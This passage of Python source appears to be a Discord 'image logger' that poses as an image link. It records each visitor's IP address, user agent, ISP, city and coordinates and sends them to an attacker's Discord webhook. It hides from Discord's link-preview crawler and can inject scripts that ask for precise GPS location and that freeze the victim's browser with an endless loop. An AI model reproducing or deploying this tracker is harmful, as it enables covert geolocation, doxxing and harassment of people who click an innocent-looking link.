    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
